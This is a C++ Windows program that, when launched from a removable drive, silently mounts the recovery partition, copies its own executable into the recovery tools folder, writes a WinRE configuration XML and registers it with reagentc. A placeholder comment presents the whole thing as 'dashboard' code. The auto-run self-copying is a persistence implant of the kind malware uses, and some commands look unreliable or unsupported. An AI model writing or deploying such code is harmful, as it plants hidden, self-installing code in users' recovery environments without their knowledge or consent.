#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

void AutoInject() {
    // 1. Mount the Recovery Partition silently to 'R:'
    // We use cmd /c to ensure system() handles the piping correctly
    system("cmd /c \"echo select disk 0 > s.txt && echo select partition 4 >> s.txt && echo assign letter=R >> s.txt\"");
    system("cmd /c \"diskpart /s s.txt > nul && del s.txt\"");

    // 2. Create the system folder structure (Using Wide-char 'W' versions)
    CreateDirectoryW(L"R:\\Sources", NULL);
    CreateDirectoryW(L"R:\\Sources\\Recovery", NULL);
    CreateDirectoryW(L"R:\\Sources\\Recovery\\Tools", NULL);

    // 3. Self-Copy: Move this .exe into the Recovery Partition
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    // Explicitly use CopyFileW for wide character support
    CopyFileW(szPath, L"R:\\Sources\\Recovery\\Tools\\RecoveryMore.exe", FALSE);

    // 4. Create the XML so the icon shows up in the blue menu
    std::ofstream xml("R:\\Sources\\Recovery\\Tools\\WinREConfig.xml");
    xml << "<?xml version=\"1.0\" encoding=\"utf-8\"?><Recovery><RecoveryTools>"
        << "<RelativeFilePath>RecoveryMore.exe</RelativeFilePath>"
        << "<CommandLineParam>/autoupdate</CommandLineParam>"
        << "</RecoveryTools></Recovery>";
    xml.close();

    // 5. Register with the system
    system("reagentc /setreimage /path R:\\Recovery\\WindowsRE /target C:\\Windows /customtool R:\\Sources\\Recovery\\Tools\\WinREConfig.xml");
    system("reagentc /enable");
}

int main(int argc, char* argv[]) {
    // Check where we are running from
    wchar_t drive[4];
    GetModuleFileNameW(NULL, drive, 4);
    
    // If running from an SD card (Removable), auto-inject then exit
    if (GetDriveTypeW(drive) == DRIVE_REMOVABLE) {
        AutoInject();
        return 0; 
    }
    
    // Otherwise, your normal dashboard code goes here
    return 0;
}
